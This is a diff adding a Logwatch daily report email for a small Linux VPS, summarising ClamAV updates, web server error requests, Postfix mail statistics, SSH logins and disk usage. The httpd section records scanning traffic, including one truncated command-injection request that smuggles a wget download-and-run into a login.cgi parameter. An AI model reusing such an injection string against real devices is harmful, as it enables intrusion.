@@ -1,0 +1,166 @@
+Return-Path: <root@hrankiety.pl>
+Delivered-To: postmaster@hrankiety.pl
+Received: by hrankiety.pl (Postfix, from userid 0)
+	id 884279F202E1; Sun, 12 Aug 2018 03:25:09 +0200 (CEST)
+To: postmaster@hrankiety.pl
+From: postmaster@hrankiety.pl
+Subject: Logwatch for 2626.serwervps.pl (Linux)
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Type: text/plain; charset="iso-8859-1"
+Message-Id: <20180812012509.884279F202E1@hrankiety.pl>
+Date: Sun, 12 Aug 2018 03:25:05 +0200 (CEST)
+
+
+ ################### Logwatch 7.3.6 (05/19/07) #################### 
+        Processing Initiated: Sun Aug 12 03:25:05 2018
+        Date Range Processed: yesterday
+                              ( 2018-Aug-11 )
+                              Period is day.
+      Detail Level of Output: 0
+              Type of Output: unformatted
+           Logfiles for Host: 2626.serwervps.pl
+  ################################################################## 
+ 
+ --------------------- clam-update Begin ------------------------ 
+
+ Last ClamAV update process started at Sat Aug 11 03:16:08 2018
+ 
+ Last Status:
+    main.cvd is up to date (version: 58, sigs: 4566249, f-level: 60, builder: sigmgr)
+    Downloading daily-24828.cdiff [100%]
+    Downloading daily-24829.cdiff [100%]
+    Downloading daily-24830.cdiff [100%]
+    Downloading daily-24831.cdiff [100%]
+    daily.cld updated (version: 24831, sigs: 2045098, f-level: 63, builder: neo)
+    bytecode.cld is up to date (version: 327, sigs: 91, f-level: 63, builder: neo)
+    [LibClamAV] Detected duplicate databases /var/lib/clamav/main.cvd and /var/lib/clamav/main.cld, please manually remove one of them
+    Database updated (6611438 signatures) from db.local.clamav.net (IP: 104.16.187.138)
+ 
+ ---------------------- clam-update End ------------------------- 
+
+ 
+ --------------------- httpd Begin ------------------------ 
+
+ 
+ Requests with error response codes
+    400 Bad Request
+       /: 4 Time(s)
+       /login.cgi?cli=aa%20aa%27;wget%20http://21 ... h%20/tmp/ks%27$: 1 Time(s)
+    404 Not Found
+       //libs/js/iframe.js: 1 Time(s)
+       //manager/html: 1 Time(s)
+       /3CX/: 1 Time(s)
+       /CfgInterval/: 1 Time(s)
+       /Domain/: 1 Time(s)
+       /FreePBX/: 1 Time(s)
+       /OutBoundProxy/: 1 Time(s)
+       /SIPAccount/: 1 Time(s)
+       /SIPRegInterval/: 1 Time(s)
+       /SIPRegOn/: 1 Time(s)
+       /StaticIP/: 1 Time(s)
+       /TftpURL/: 1 Time(s)
+       /UseTftp/: 1 Time(s)
+       /a2billing/admin/Public/PP_error.php?c=accessdenied: 1 Time(s)
+       /aastra.cfg/: 1 Time(s)
+       /aastra/: 1 Time(s)
+       /ata/: 1 Time(s)
+       /ccvv: 1 Time(s)
+       /cfg/: 1 Time(s)
+       /cisco.cfg/: 1 Time(s)
+       /cisco/: 1 Time(s)
+       /configs/: 1 Time(s)
+       /dms/: 1 Time(s)
+       /elastix/: 1 Time(s)
+       /grandstream/: 1 Time(s)
+       /linksys/: 1 Time(s)
+       /pbx/: 1 Time(s)
+       /polycom/: 1 Time(s)
+       /prov/: 1 Time(s)
+       /provision/: 1 Time(s)
+       /provisioning/: 1 Time(s)
+       /recordings/: 1 Time(s)
+       /sark_sip_main.conf/: 1 Time(s)
+       /sipport/: 1 Time(s)
+       /sipura/: 1 Time(s)
+       /smb/css/startup.png: 2 Time(s)
+       /snom/: 1 Time(s)
+       /spa/: 1 Time(s)
+       /telstra/: 1 Time(s)
+       /tftp/: 1 Time(s)
+       /tftpboot/: 1 Time(s)
+       /tftpphone/: 1 Time(s)
+       /tftproot/: 1 Time(s)
+       /xml/: 1 Time(s)
+       /xmlrpc.php: 1 Time(s)
+       /xms/: 1 Time(s)
+       /xsd/: 1 Time(s)
+       /yealink/: 1 Time(s)
+       /zyxel/: 1 Time(s)
+ 
+ ---------------------- httpd End ------------------------- 
+
+ 
+ --------------------- Postfix Begin ------------------------ 
+
+       23   *Warning: Pre-queue content-filter connection overload 
+     8642   SASL authentication failed 
+       19   Miscellaneous warnings 
+ 
+  503.473K  Bytes accepted                           515,556
+  497.412K  Bytes delivered                          509,350
+ ========   ================================================
+ 
+       11   Accepted                                  91.67%
+        1   Rejected                                   8.33%
+ --------   ------------------------------------------------
+       12   Total                                    100.00%
+ ========   ================================================
+ 
+        1   Reject HELO/EHLO                         100.00%
+ --------   ------------------------------------------------
+        1   Total Rejects                            100.00%
+ ========   ================================================
+ 
+     8670   Connections made      
+     8672   Disconnections        
+       11   Removed from queue    
+        9   Delivered             
+        2   Bounce (remote)       
+        1   DSNs undeliverable    
+ 
+        1   Timeout (inbound)     
+        2   SMTP protocol violations 
+ 
+ 
+ 
+ ---------------------- Postfix End ------------------------- 
+
+ 
+ --------------------- SSHD Begin ------------------------ 
+
+ 
+ Users logging in through sshd:
+    btertil:
+       185.17.41.230 (backup): 2 times
+ 
+ 
+ Received disconnect:
+    11: disconnected by user : 2 Time(s)
+ 
+ ---------------------- SSHD End ------------------------- 
+
+ 
+ --------------------- Disk Space Begin ------------------------ 
+
+ Filesystem      Size  Used Avail Use% Mounted on
+ /dev/simfs       50G   23G   28G  46% /
+ none            512M  4.0K  512M   1% /dev
+ 
+ 
+ ---------------------- Disk Space End ------------------------- 
+
+ 
+ ###################### Logwatch End ######################### 
+
+ 
